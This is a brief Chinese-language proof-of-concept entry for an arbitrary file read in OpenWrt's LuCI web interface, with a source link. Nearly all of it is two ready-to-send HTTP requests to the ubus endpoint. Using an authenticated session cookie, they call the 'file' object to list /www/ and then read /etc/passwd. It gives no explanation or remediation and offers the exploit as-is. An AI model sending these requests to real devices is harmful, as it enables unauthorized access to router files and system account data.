# OpenWrt任意文件读取

## poc

```javascript
POST /cgi-bin/luci/admin/ubus?1733734260589 HTTP/1.1
Host: 192.168.121.180
Content-Length: 121
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.121.180
Referer: http://192.168.121.180/cgi-bin/luci/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: sysauth=305ade5ef36d6ced39e386729e8868b6
Connection: close

[{"jsonrpc":"2.0","id":0,"method":"call","params":["305ade5ef36d6ced39e386729e8868b6","file","list",{"path":"/www/"}]}]
```

```javascript
POST /cgi-bin/luci/admin/ubus?1733734260589 HTTP/1.1
Host: 192.168.121.180
Content-Length: 127
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.121.180
Referer: http://192.168.121.180/cgi-bin/luci/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: sysauth=305ade5ef36d6ced39e386729e8868b6
Connection: close

[{"jsonrpc":"2.0","id":0,"method":"call","params":["305ade5ef36d6ced39e386729e8868b6","file","read",{"path":"/etc/passwd"}]}]
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112142249.webp)



## 漏洞来源

- https://mp.weixin.qq.com/s/nRSmiZy5JMt-0K1sSeUexw